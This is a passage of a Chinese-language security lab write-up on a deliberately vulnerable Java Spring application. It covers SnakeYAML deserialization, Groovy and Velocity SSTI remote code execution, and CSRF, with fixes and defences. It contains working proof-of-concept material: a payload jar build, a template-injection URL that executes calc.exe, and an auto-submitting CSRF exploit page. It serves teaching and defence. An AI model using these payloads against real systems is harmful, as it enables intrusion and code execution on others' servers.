punctuation">&#125;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="18"></td><td><pre></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token annotation punctuation">@Override</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getEngineName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>        <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="23"></td><td><pre></pre></td></tr><tr><td data-num="24"></td><td><pre>    <span class="token annotation punctuation">@Override</span></pre></td></tr><tr><td data-num="25"></td><td><pre>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getEngineVersion</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>        <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="28"></td><td><pre></pre></td></tr><tr><td data-num="29"></td><td><pre>    <span class="token annotation punctuation">@Override</span></pre></td></tr><tr><td data-num="30"></td><td><pre>    <span class="token keyword">public</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> <span class="token function">getExtensions</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="31"></td><td><pre>        <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="32"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="33"></td><td><pre></pre></td></tr><tr><td data-num="34"></td><td><pre>    <span class="token annotation punctuation">@Override</span></pre></td></tr><tr><td data-num="35"></td><td><pre>    <span class="token keyword">public</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> <span class="token function">getMimeTypes</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="36"></td><td><pre>        <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="37"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="38"></td><td><pre></pre></td></tr><tr><td data-num="39"></td><td><pre>    <span class="token annotation punctuation">@Override</span></pre></td></tr><tr><td data-num="40"></td><td><pre>    <span class="token keyword">public</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> <span class="token function">getNames</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="41"></td><td><pre>        <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="42"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="43"></td><td><pre></pre></td></tr><tr><td data-num="44"></td><td><pre>    <span class="token annotation punctuation">@Override</span></pre></td></tr><tr><td data-num="45"></td><td><pre>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getLanguageName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="46"></td><td><pre>        <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="47"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="48"></td><td><pre></pre></td></tr><tr><td data-num="49"></td><td><pre>    <span class="token annotation punctuation">@Override</span></pre></td></tr><tr><td data-num="50"></td><td><pre>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getLanguageVersion</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="51"></td><td><pre>        <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="52"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="53"></td><td><pre></pre></td></tr><tr><td data-num="54"></td><td><pre>    <span class="token annotation punctuation">@Override</span></pre></td></tr><tr><td data-num="55"></td><td><pre>    <span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token class-name">String</span> key<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="56"></td><td><pre>        <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="57"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="58"></td><td><pre></pre></td></tr><tr><td data-num="59"></td><td><pre>    <span class="token annotation punctuation">@Override</span></pre></td></tr><tr><td data-num="60"></td><td><pre>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getMethodCallSyntax</span><span class="token punctuation">(</span><span class="token class-name">String</span> obj<span class="token punctuation">,</span> <span class="token class-name">String</span> m<span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="61"></td><td><pre>        <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="62"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="63"></td><td><pre></pre></td></tr><tr><td data-num="64"></td><td><pre>    <span class="token annotation punctuation">@Override</span></pre></td></tr><tr><td data-num="65"></td><td><pre>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getOutputStatement</span><span class="token punctuation">(</span><span class="token class-name">String</span> toDisplay<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="66"></td><td><pre>        <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="67"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="68"></td><td><pre></pre></td></tr><tr><td data-num="69"></td><td><pre>    <span class="token annotation punctuation">@Override</span></pre></td></tr><tr><td data-num="70"></td><td><pre>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getProgram</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> statements<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="71"></td><td><pre>        <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="72"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="73"></td><td><pre></pre></td></tr><tr><td data-num="74"></td><td><pre>    <span class="token annotation punctuation">@Override</span></pre></td></tr><tr><td data-num="75"></td><td><pre>    <span class="token keyword">public</span> <span class="token class-name">ScriptEngine</span> <span class="token function">getScriptEngine</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="76"></td><td><pre>        <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="77"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="78"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><pre><code>javac src/artsploit/AwesomeScriptEngineFactory.java
jar -cvf yaml-payload.jar -C src/ .
</code></pre>
<p>漏洞验证：</p>
<p><img data-src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202507111558771.png" alt="image-20250711155759148" /></p>
<p>还是得开着 mysql 才能出来（被坑了）</p>
<p>漏洞修复：</p>
<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token class-name">Yaml</span> y <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Yaml</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">SafeConstructor</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr></table></figure><h3 id="5路由rcegroovy"><a class="anchor" href="#5路由rcegroovy">#</a> 5. 路由 /rce/groovy</h3>
<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"groovy"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">groovyshell</span><span class="token punctuation">(</span><span class="token class-name">String</span> content<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token class-name">GroovyShell</span> groovyShell <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">GroovyShell</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    groovyShell<span class="token punctuation">.</span><span class="token function">evaluate</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>漏洞利用：</p>
<p><img data-src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202507111600788.png" alt="image-20250711160055465" /></p>
<h2 id="ssti"><a class="anchor" href="#ssti">#</a> SSTI</h2>
<p>漏洞代码：</p>
<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/velocity"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">velocity</span><span class="token punctuation">(</span><span class="token class-name">String</span> template<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>        <span class="token class-name">Velocity</span><span class="token punctuation">.</span><span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>        <span class="token class-name">VelocityContext</span> context <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">VelocityContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre>        context<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"author"</span><span class="token punctuation">,</span> <span class="token string">"Elliot A."</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>        context<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"address"</span><span class="token punctuation">,</span> <span class="token string">"217 E Broadway"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>        context<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"phone"</span><span class="token punctuation">,</span> <span class="token string">"555-1337"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre></pre></td></tr><tr><td data-num="11"></td><td><pre>        <span class="token class-name">StringWriter</span> swOut <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>        <span class="token class-name">Velocity</span><span class="token punctuation">.</span><span class="token function">evaluate</span><span class="token punctuation">(</span>context<span class="token punctuation">,</span> swOut<span class="token punctuation">,</span> <span class="token string">"test"</span><span class="token punctuation">,</span> template<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>Apache Velocity 是一个基于模板的引擎，用于生成文本输出（例如：HTML、XML 或任何其他形式得 ASCII 文本），它得设计目标是提供一种简单得方式来讲模板和上下文数据结合在一起，因此被广泛应用于各种 java 应用程序中包括 web 应用。具体得 Apache Velovity 引擎得应用 可以看<span class="exturl" data-url="aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC83MTY3NTY5MjY=">这篇博客</span>。</p>
<h3 id="velocityevaluate"><a class="anchor" href="#velocityevaluate">#</a> Velocity.evaluate</h3>
<p>velocity.evalueate 是 Velocity 引擎中的一个方法，用于处理字符串模板的评估，Velocity 是一个基于 java 的模板引擎，广泛应用于 WEB 开发和其他需要动态内容生成的场合，Velocity.evaluate 方法的主要作用是将给定的模板字符串于上下文对象结合并生成最终的输出结果，这个方法通常用于在运行是动态创建内容，</p>
<p>方法如下所示：</p>
<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">evaluate</span><span class="token punctuation">(</span><span class="token class-name">Context</span> context<span class="token punctuation">,</span> <span class="token class-name">Writer</span> writer<span class="token punctuation">,</span> <span class="token class-name">String</span> templateName<span class="token punctuation">,</span> <span class="token class-name">String</span> template<span class="token punctuation">)</span></pre></td></tr></table></figure><p>参数说明：</p>
<pre><code>Context context：提供模板所需的数据上下文，可以包含多个键值对
Writer writer：输出流，用于写入生成的内容
String templateName：模板的名称，通常用于调试信息中
String template：要评估的模板字符串
</code></pre>
<p>可以构造以下代码：</p>
<pre><code>http://127.0.0.1:8080/ssti/velocity?template=%23set($e=%22e%22);$e.getClass().forName(%22java.lang.Runtime%22).getMethod(%22getRuntime%22,null).invoke(null,null).exec(%22calc.exe%22)
</code></pre>
<p><img data-src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202507111639892.png" alt="image-20250711163948592" /></p>
<h2 id="csrf"><a class="anchor" href="#csrf">#</a> CSRF</h2>
<h3 id="1路由csrfpost"><a class="anchor" href="#1路由csrfpost">#</a> 1. 路由 /csrf/post</h3>
<p>漏洞源码：</p>
<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token annotation punctuation">@Controller</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/csrf"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CSRF</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>        <span class="token keyword">return</span> <span class="token string">"form"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token annotation punctuation">@PostMapping</span><span class="token punctuation">(</span><span class="token string">"/post"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token annotation punctuation">@ResponseBody</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">post</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>        <span class="token keyword">return</span> <span class="token string">"CSRF passed."</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>对应前端代码：</p>
<figure class="highlight html"><figcaption data-lang="HTML"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name"><span class="token namespace">xmlns:</span>th</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.thymeleaf.org<span class="token punctuation">"</span></span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name"><span class="token namespace">th:</span>src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>@&#123;https://code.jquery.com/jquery-3.4.1.min.js&#125;<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token comment">&lt;!-- th:action with Spring 3.2+ and Thymeleaf 2.1+ can automatically force Thymeleaf to include the CSRF token as a hidden field --></span></pre></td></tr><tr><td data-num="13"></td><td><pre>    <span class="token comment">&lt;!-- &lt;form name="f" th:action="@&#123;/csrf/post&#125;" method="post"> --></span></pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>f<span class="token punctuation">"</span></span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/csrf/post<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="15"></td><td><pre>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>input<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span></pre></td></tr><tr><td data-num="16"></td><td><pre>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Submit<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span></pre></td></tr><tr><td data-num="17"></td><td><pre>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">th:</span>name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;_csrf.parameterName&#125;<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">th:</span>value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;_csrf.token&#125;<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span></pre></td></tr><tr><td data-num="18"></td><td><pre>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="20"></td><td><pre></pre></td></tr><tr><td data-num="21"></td><td><pre></pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="23"></td><td><pre></pre></td></tr><tr><td data-num="24"></td><td><pre></pre></td></tr><tr><td data-num="25"></td><td><pre></pre></td></tr><tr><td data-num="26"></td><td><pre></pre></td></tr><tr><td data-num="27"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></pre></td></tr></table></figure><p>该代码由于 /csrf/post 没有进行 token 的验证，可以直接访问，直接 poc 漏洞验证就好了：</p>
<figure class="highlight html"><figcaption data-lang="HTML"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>CSRF Exploit<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>Simulating CSRF Attack<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="10"></td><td><pre></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>csrfForm<span class="token punctuation">"</span></span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://127.0.0.1:8080/csrf/post<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="12"></td><td><pre>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>message<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>This is a CSRF attack message<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="13"></td><td><pre>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript"></pre></td></tr><tr><td data-num="16"></td><td><pre>        <span class="token comment">// 自动提交表单，执行攻击</span></pre></td></tr><tr><td data-num="17"></td><td><pre>        document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'csrfForm'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></pre></td></tr></table></figure><p><img data-src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202507131613625.png" alt="image-20250713161313228" /></p>
<h4 id="csrf防护"><a class="anchor" href="#csrf防护">#</a> csrf 防护：</h4>
<h5 id="使用csrf-token"><a class="anchor" href="#使用csrf-token">#</a> <strong>使用 CSRF Token</strong>：</h5>
<ul>
<li>服务器生成一个唯一的 CSRF Token 并将其发送给用户（通常通过隐藏字段、URL 参数或 HTTP 头）。</li>
<li>在提交表单或发起请求时，客户端将该 Token 一同发送回服务器，服务器验证 Token 的有效性以防止伪造请求。</li>
</ul>
<h5 id="samesite-cookie-属性"><a class="anchor" href="#samesite-cookie-属性">#</a> <strong>SameSite Cookie 属性</strong>：</h5>
<ul>
<li>设置 Cookie 的 <code>SameSite</code>  属性为 <code>Strict</code>  或 <code>Lax</code> ，限制第三方网站通过跨站点方式发送 Cookie。</li>
<li><code>Strict</code> ：禁止任何跨站请求携带 Cookie。</li>
<li><code>Lax</code> ：允许一些安全的跨站请求（例如 GET 请求），但阻止 POST 等敏感操作。</li>
</ul>
<h5 id="双重cookie验证"><a class="anchor" href="#双重cookie验证">#</a> <strong>双重 Cookie 验证</strong>：</h5>
<ul>
<li>服务器发送一个 Cookie 给用户，客户端在请求时会自动携带该 Cookie。</li>
<li>客户端还需要在表单中携带相同的值（通过 JS 从 Cookie 中提取），服务器检查这两个值是否匹配。</li>
</ul>
<h5 id="检查referer头"><a class="anchor" href="#检查referer头">#</a> <strong>检查 Referer 头</strong>：</h5>
<ul>
<li>服务器通过验证请求头中的 <code>Referer</code>  字段是否来自合法的域名，来确定请求是否来自可信来源。</li>
<li>这种方法并不完全可靠，因为有些环境下 <code>Referer</code>  头可能会被修改或省略。</li>
</ul>
<h5 id="captcha"><a class="anchor" href="#captcha">#</a> <strong>CAPTCHA</strong>：</h5>
<ul>
<li>使用 CAPTCHA 来确保请求是由真实用户而非自动化脚本发起，虽然这种方式不能完全防护 CSRF，但能增加攻击难度。</li>
</ul>
<p><strong>限制请求来源</strong>：</p>
<ul>
<li>对敏感操作（如资金转移、修改账户信息等）设置请求来源的严格验证，确保这些操作只能通过特定的合法来源进行。</li>
</ul>
<h2 id="xss"><a class="anchor" href="#xss">#</a> XSS</h2>
<h3 id="1路由xssreflext"><a class="anchor" href="#1路由xssreflext">#</a> 1. 路由 /xss/reflext：</h3>
<p>源码：</p>
